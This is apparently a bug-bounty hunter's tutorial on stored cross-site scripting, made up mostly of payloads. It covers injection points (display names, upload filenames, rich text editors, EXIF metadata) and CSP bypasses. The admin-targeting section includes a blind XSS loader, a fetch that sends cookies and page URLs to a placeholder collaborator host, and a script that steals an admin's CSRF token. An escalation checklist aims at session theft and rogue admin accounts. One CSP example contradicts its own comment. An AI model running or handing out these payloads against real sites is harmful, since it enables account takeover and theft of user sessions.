Stored XSS
Stored XSS is the one that pays. It sits in the DB, waits, and fires on every victim who renders it  -  including admins. An alert(1) in a comment section is a P3. The same payload that fires in an admin's browser while they're reviewing user reports? P1.
Where to Plant Payloads
Not all storage vectors are created equal. I rank them by blast radius:
flowchart TD
    A[Storage Vectors] --> B[Admin-Rendered]
    A --> C[User-Rendered]
    B --> D[Username / Display Name]
    B --> E[Report/Ticket Content]
    B --> F[File Upload Name]
    B --> G[API Keys / Custom Fields]
    C --> H[Comments / Reviews]
    C --> I[Bio / Profile Fields]
    C --> J[Message / Chat]

Profile Fields  -  Display Name
The display name is gold. It renders in:

Admin user management panels
Activity logs
Chat headers
Email notifications (sometimes triggers email clients)

<img src=x onerror=alert(document.domain)>
<svg/onload=alert(1)>
If there's a character limit on the UI, test the raw API request  -  the limit is often only front-end enforced.
File Upload Names
When you upload malicious.jpg, does the filename get stored and rendered somewhere? Check:

File management pages
Download links
Admin audit logs
Email receipts

Payload filename: <img src=x onerror=alert(1)>.jpg
URL-encoded:      %3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E.jpg
Send the upload via Burp  -  intercept the multipart request and change filename= directly.
Rich Text Editors (WYSIWYG)
TinyMCE, Quill, CKEditor  -  they all have a server-side sanitizer you need to beat. Client-side sanitization is irrelevant; post directly.
<!-- Common bypasses for rich text editor filters -->
<a href="javascript:alert(1)">click me</a>
<img src=1 onerror=alert(1)>
 
<!-- SVG with embedded event (often missed) -->
<svg><animate onbegin=alert(1) attributeName=x></svg>
<svg><set attributeName=onmouseover to=alert(1)></svg>
Comment Fields / Reviews
Widest audience, lowest privilege  -  but useful for:

Reflected attack chains (XSS + CSRF = account takeover)
Self-XSS escalation via CSRF (force victim to submit a form that stores your payload)

Metadata in Uploaded Files
EXIF data in images, PDF metadata, Office doc properties. If the app extracts and displays metadata:
# Inject XSS into EXIF comment field
exiftool -Comment='<img src=x onerror=alert(1)>' photo.jpg
 
# Or into the Author field of a PDF
exiftool -Author='<svg onload=alert(1)>' document.pdf
Admin Panel Targeting
My go-to for escalating stored XSS to critical:

Find any user-controlled field that an admin views (username, report text, uploaded file name, contact form message).
Drop a blind XSS payload that callbacks to a listener  -  I use xsshunter.com or self-hosted.
Wait for the admin to view it.
The callback tells me the URL where it fired, the cookies, and the DOM.

// Blind XSS payload  -  works in one-liner attribute contexts too
"><script src=//YOUR.XSSHUNTER.COM/xss.js></script>
 
// Manual exfil  -  cookie + current URL
<img src=x onerror="fetch('https://COLLAB/?u='+btoa(location.href)+'&c='+btoa(document.cookie))">
 
// Grab admin CSRF token  -  escalates to full account takeover
<script>
fetch('/settings').then(r=>r.text()).then(t=>{
  let token = t.match(/csrf[^"]*"[^"]+"/i)?.[0];
  fetch('https://COLLAB/?token='+btoa(token));
});
</script>
CSP Bypass for Stored XSS
If the app has a Content-Security-Policy, read it before assuming you're blocked:
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com
Look for:

CDN whitelisted domains you can upload JS to (GitHub, Google APIs, etc.)
unsafe-inline anywhere
JSONP endpoints on whitelisted domains
Angular/React chunk files that accept user-controlled data

<!-- If cdn.jquery.com is whitelisted and it has a JSONP endpoint -->
<script src="cdn.example.com/angular.js"></script>
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
Escalation Checklist

 Does it fire in an admin panel?
 Can I steal the admin's session cookie?
 Is HttpOnly set? → Go for CSRF token exfil instead
 Can I use the XSS to make authenticated requests as the admin?
 Can I use it to add a new admin account or change email/password?
